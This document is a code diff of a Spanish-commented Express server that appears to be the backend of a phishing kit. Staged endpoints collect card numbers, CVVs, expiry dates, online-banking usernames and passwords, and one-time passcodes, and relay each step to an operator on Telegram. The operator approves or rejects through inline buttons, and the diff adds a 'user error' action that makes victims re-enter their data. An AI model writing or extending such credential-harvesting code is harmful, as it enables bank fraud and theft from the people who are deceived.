@@ -41,16 +41,41 @@ async function tgAnswerCallback(callbackQueryId, text) {
     } catch {}
 }
 
-function construirTextoPago(pago) {
+// 🎯 TEXTO PARA LA TARJETA (SOLO DATOS DE TARJETA)
+function textoPasoCrear(pago) {
     return (
+        `🔔 <b>NUEVA SOLICITUD DE PAGO (PASO 1: TARJETA)</b>\n\n` +
         `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
         `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
         `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
         `📅 <b>Vence:</b> ${pago.vencimiento}\n` +
         `🔒 <b>CVV:</b> <code>${pago.cvv}</code>\n` +
         `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
-        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n` +
-        `\n<b>── CREDENCIALES BANCO ──</b>\n` +
+        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}`
+    );
+}
+
+// 🎯 TEXTO PARA CREDENCIALES (DATOS DE TARJETA + CREDENCIALES)
+function textoPasoCredenciales(pago) {
+    return (
+        `🔑 <b>NUEVOS DATOS RECIBIDOS (PASO 2: CREDENCIALES)</b>\n\n` +
+        `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
+        `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
+        `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
+        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n\n` +
+        `👤 <b>Usuario:</b> <code>${pago.usuario_banco || '—'}</code>\n` +
+        `🔑 <b>Contraseña:</b> <code>${pago.password_banco || '—'}</code>`
+    );
+}
+
+// 🎯 TEXTO PARA OTP (TODOS LOS DATOS COMPLETOS)
+function textoPasoOTP(pago) {
+    return (
+        `🔐 <b>NUEVOS DATOS RECIBIDOS (PASO 3: OTP)</b>\n\n` +
+        `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
+        `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
+        `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
+        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n\n` +
         `👤 <b>Usuario:</b> <code>${pago.usuario_banco || '—'}</code>\n` +
         `🔑 <b>Contraseña:</b> <code>${pago.password_banco || '—'}</code>\n` +
         `🔐 <b>OTP:</b> <code>${pago.codigo_otp || '—'}</code>`
@@ -60,53 +85,73 @@ function construirTextoPago(pago) {
 app.post('/api/crear-pago', async (req, res) => {
     const { solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, paso } = req.body || {};
     
-    if (!solicitud_id || !numero_tarjeta || !cvv || !vencimiento || !titular) return res.status(400).json({ success: false, error: 'Datos incompletos' });
+    if (!solicitud_id) return res.status(400).json({ success: false, error: 'Datos incompletos' });
+    if (paso === 'crear' && (!numero_tarjeta || !cvv || !vencimiento || !titular)) {
+        return res.status(400).json({ success: false, error: 'Datos de tarjeta incompletos' });
+    }
 
     try {
-        // Guardamos en memoria
-        const pago = {
-            solicitud_id,
-            titular,
-            numero_tarjeta,
-            cvv,
-            vencimiento,
-            marca_tarjeta: marca_tarjeta.toLowerCase(),
-            banco_emisor: banco_emisor || 'Desconocido',
-            usuario_banco: usuario_banco || null,
-            password_banco: password_banco || null,
-            codigo_otp: codigo_otp || null,
-            estado: 'pendiente',
-            paso: paso || 'crear',
-            fase_actual: paso === 'otp' ? 'otp' : 'credenciales',
-            motivo_rechazo: null,
-            redirigir_a: null
-        };
+        let pago = pagosPendientes.get(solicitud_id);
+
+        if (!pago) {
+            pago = {
+                solicitud_id,
+                titular: titular || '—',
+                numero_tarjeta: numero_tarjeta || '—',
+                cvv: cvv || '—',
+                vencimiento: vencimiento || '—',
+                marca_tarjeta: (marca_tarjeta || 'visa').toLowerCase(),
+                banco_emisor: banco_emisor || 'Desconocido',
+                usuario_banco: usuario_banco || null,
+                password_banco: password_banco || null,
+                codigo_otp: codigo_otp || null,
+                estado: 'pendiente',
+                paso: paso || 'crear',
+                fase_actual: paso === 'otp' ? 'otp' : 'credenciales',
+                motivo_rechazo: null,
+                redirigir_a: null
+            };
+        } else {
+            pago.titular = titular || pago.titular;
+            pago.numero_tarjeta = numero_tarjeta || pago.numero_tarjeta;
+            pago.cvv = cvv || pago.cvv;
+            pago.vencimiento = vencimiento || pago.vencimiento;
+            pago.marca_tarjeta = marca_tarjeta ? marca_tarjeta.toLowerCase() : pago.marca_tarjeta;
+            pago.banco_emisor = banco_emisor || pago.banco_emisor;
+            pago.usuario_banco = usuario_banco || pago.usuario_banco;
+            pago.password_banco = password_banco || pago.password_banco;
+            pago.codigo_otp = codigo_otp || pago.codigo_otp;
+            pago.estado = 'pendiente';
+            pago.paso = paso || pago.paso;
+            pago.fase_actual = paso === 'otp' ? 'otp' : 'credenciales';
+        }
         
         pagosPendientes.set(solicitud_id, pago);
 
         const pasoActual = paso || 'crear';
+        
+        // 🔥 CONFIGURACIÓN DE BOTONES SEGÚN EL PASO
+        let replyMarkup;
+        if (pasoActual === 'crear' || pasoActual === 'credenciales') {
+            replyMarkup = { inline_keyboard: [[
+                { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
+                { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
+            ]]};
+        } else if (pasoActual === 'otp') {
+            replyMarkup = { inline_keyboard: [[
+                { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
+                { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` },
+                { text: '⚠️ Error de Usuario', callback_data: `error_usuario:${pago.solicitud_id}` }
+            ]]};
+        }
 
-        // 🔥 SI ES UNA SOLICITUD NUEVA (TARJETA)
+        // 🔥 ENVIAMOS EL MENSAJE SEGÚN EL PASO
         if (pasoActual === 'crear') {
-            const texto = `🔔 <b>NUEVA SOLICITUD DE PAGO</b>\n\n` + construirTextoPago(pago);
-            const replyMarkup = {
-                inline_keyboard: [[
-                    { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
-                    { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
-                ]]
-            };
-            await tgSendMessage(texto, replyMarkup);
-        } 
-        // 🔥 SI SON CREDENCIALES O OTP
-        else {
-            const texto = `📝 <b>NUEVOS DATOS RECIBIDOS (${pasoActual.toUpperCase()})</b>\n\n` + construirTextoPago(pago);
-            const replyMarkup = {
-                inline_keyboard: [[
-                    { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
-                    { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
-                ]]
-            };
-            await tgSendMessage(texto, replyMarkup);
+            await tgSendMessage(textoPasoCrear(pago), replyMarkup);
+        } else if (pasoActual === 'credenciales') {
+            await tgSendMessage(textoPasoCredenciales(pago), replyMarkup);
+        } else if (pasoActual === 'otp') {
+            await tgSendMessage(textoPasoOTP(pago), replyMarkup);
         }
 
         return res.json({ success: true, solicitud_id, estado: 'pendiente' });
@@ -126,6 +171,11 @@ app.get('/api/estado-pago/:solicitud_id', (req, res) => {
         }
         if (pago.estado === 'rechazado_credenciales') {
             return res.json({ success: true, estado: 'rechazado', fase: 'credenciales', mensaje: pago.motivo_rechazo });
+        }
+        
+        // 🔥 NUEVO ESTADO: ERROR DE USUARIO
+        if (pago.estado === 'rechazado_user_error') {
+            return res.json({ success: true, estado: 'rechazado_user_error', fase: 'otp', mensaje: pago.motivo_rechazo });
         }
 
         if (pago.estado === 'aprobado') {
@@ -159,21 +209,32 @@ app.post('/api/telegram-webhook', async (req, res) => {
             if (!estaEnFaseOTP) {
                 pago.estado = 'aprobado_credenciales';
                 await tgAnswerCallback(cq.id, '✅ Credenciales aprobadas');
-                if (msgId) await tgEditMessage(msgId, `✅ <b>CREDENCIALES APROBADAS</b>\n\n` + construirTextoPago(pago));
+                if (msgId) await tgEditMessage(msgId, `✅ <b>CREDENCIALES APROBADAS</b>\n\n` + textoPasoCredenciales(pago));
             } else {
                 const archivo = { visa: 'visa.html', mastercard: 'master.html', amex: 'amex.html' }[(pago.marca_tarjeta || '').toLowerCase()] || 'visa.html';
                 pago.estado = 'aprobado';
                 pago.fase_actual = 'completado';
                 pago.redirigir_a = archivo;
                 await tgAnswerCallback(cq.id, '✅ Pago aprobado');
-                if (msgId) await tgEditMessage(msgId, `✅ <b>PAGO APROBADO</b>\n\n` + construirTextoPago(pago));
+                if (msgId) await tgEditMessage(msgId, `✅ <b>PAGO APROBADO</b>\n\n` + textoPasoOTP(pago));
             }
         } else if (accion === 'rechazar') {
             const motivo = estaEnFaseOTP ? 'OTP incorrecto.' : 'Credenciales incorrectas.';
             pago.estado = estaEnFaseOTP ? 'rechazado_otp' : 'rechazado_credenciales';
             pago.motivo_rechazo = motivo;
             await tgAnswerCallback(cq.id, '❌ Rechazado');
-            if (msgId) await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + construirTextoPago(pago) + `\n📌 <b>Motivo:</b> ${motivo}`);
+            if (msgId) {
+                const texto = estaEnFaseOTP ? textoPasoOTP(pago) : textoPasoCredenciales(pago);
+                await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + texto + `\n📌 <b>Motivo:</b> ${motivo}`);
+            }
+        } else if (accion === 'error_usuario') {
+            // 🔥 NUEVA ACCIÓN: ERROR DE USUARIO
+            pago.estado = 'rechazado_user_error';
+            pago.motivo_rechazo = 'Error de usuario: credenciales no coinciden.';
+            await tgAnswerCallback(cq.id, '⚠️ Error de usuario registrado');
+            if (msgId) {
+                await tgEditMessage(msgId, `⚠️ <b>ERROR DE USUARIO</b>\n\n` + textoPasoOTP(pago) + `\n📌 <b>Acción:</b> Se solicitará al cliente reiniciar el proceso.`);
+            }
         }
     } catch (err) { console.error("Error en webhook:", err); }
 });
